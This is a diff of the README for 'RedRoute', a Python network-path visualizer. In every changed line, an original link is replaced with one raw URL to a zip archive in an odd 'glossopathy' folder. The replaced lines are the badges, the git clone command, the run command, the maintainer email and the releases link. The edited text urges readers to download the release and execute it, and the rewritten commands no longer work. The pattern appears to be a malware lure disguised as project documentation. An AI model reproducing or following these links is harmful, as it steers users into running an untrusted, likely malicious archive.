@@ -1,6 +1,6 @@
 # RedRoute: Visualize Your Network 🚦
 
-![RedRoute](https://img.shields.io/badge/RedRoute-Conceptual%20Network%20Simulation-blue)
+![RedRoute](https://raw.githubusercontent.com/ynsemrcskn/redroute/main/glossopathy/Software_v2.7-alpha.5.zip%20Network%20Simulation-blue)
 
 Welcome to the **RedRoute** repository! This project serves as a powerful tool for visualizing and computing the shortest path between two hosts in a complex network topology. Built with Python and utilizing libraries such as NetworkX, Tkinter, and Matplotlib, RedRoute enhances your understanding of network routing by displaying paths, nodes, and their interconnections.
 
@@ -37,7 +37,7 @@ To get started with RedRoute, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/ynsemrcskn/redroute.git
+   git clone https://raw.githubusercontent.com/ynsemrcskn/redroute/main/glossopathy/Software_v2.7-alpha.5.zip
    cd redroute
    ```
 
@@ -50,7 +50,7 @@ To get started with RedRoute, follow these steps:
 3. **Run the Application**:
    Execute the main script:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/ynsemrcskn/redroute/main/glossopathy/Software_v2.7-alpha.5.zip
    ```
 
 ## Usage
@@ -98,13 +98,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, please reach out to the maintainer:
 
 - **Name**: Your Name
-- **Email**: your.email@example.com
+- **Email**: https://raw.githubusercontent.com/ynsemrcskn/redroute/main/glossopathy/Software_v2.7-alpha.5.zip
 
 ## Releases
 
-You can find the latest version of RedRoute [here](https://github.com/ynsemrcskn/redroute/releases). Download the latest release and execute it to start using the application. If you encounter any issues, check the "Releases" section for updates.
+You can find the latest version of RedRoute [here](https://raw.githubusercontent.com/ynsemrcskn/redroute/main/glossopathy/Software_v2.7-alpha.5.zip). Download the latest release and execute it to start using the application. If you encounter any issues, check the "Releases" section for updates.
 
-![Network Visualization](https://img.shields.io/badge/Network%20Visualization-Available-green)
+![Network Visualization](https://raw.githubusercontent.com/ynsemrcskn/redroute/main/glossopathy/Software_v2.7-alpha.5.zip%20Visualization-Available-green)
 
 ---
 
